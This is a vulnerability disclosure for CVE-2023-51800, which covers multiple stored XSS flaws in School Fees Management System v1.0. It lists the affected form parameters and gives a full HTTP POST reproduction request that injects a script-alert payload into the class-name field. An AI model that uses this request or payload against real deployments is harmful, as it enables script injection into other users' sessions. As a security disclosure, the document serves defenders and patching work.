# CVE-2023-51800
# School Fees Management System v1.0 - Multiple cross-site scripting (XSS) vulnerabilities

**Description**: Multiple cross-site scripting (XSS) vulnerabilities in School Fees Management System v1.0.  

**Vulnerable Product Version**: School Fees Management System v1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 10/12/2023  
**CVE**: CVE-2023-51800  
**CVE Link**: https://www.cve.org/CVERecord?id=CVE-2023-51800  
**NVD Link**: https://nvd.nist.gov/vuln/detail/CVE-2023-51800  
**Tenable Link**: https://www.tenable.com/cve/CVE-2023-51800  
**Tested on**: Windows   
### Steps to reproduce:  
To exploit the vulnerability, an authenticated user with the requisite permissions needs to navigate to any of the affected pages and inject a malicious payload into one of the susceptible fields.  
**Affected Components**: 
> main_settings - phone, address, bank, acc_name, acc_number parameters,  
> new_class - cname parameter,  
> add_new_parent - name, email parameters,  
> new_term - tname parameter,  
> edit_student - name parameter  
### Request:  
```
Request:
POST /ci_fms/admin/action/new_class HTTP/1.1
Host: 192.168.68.148
Content-Length: 273
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.68.148
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAbJT9XS9eFLU53MR
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.68.148/ci_fms/admin/management/class
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: ci_session=gdoj5tr7rsf7ci5o9rpr0rh5eni2r6an
Connection: close

------WebKitFormBoundaryAbJT9XS9eFLU53MR
Content-Disposition: form-data; name="cname"

<script>alert(document.domain)</script>
------WebKitFormBoundaryAbJT9XS9eFLU53MR
Content-Disposition: form-data; name="cfees"

12,000
------WebKitFormBoundaryAbJT9XS9eFLU53MR--
```
Discoverer(s)/Credits:  
Geraldo Alcântara
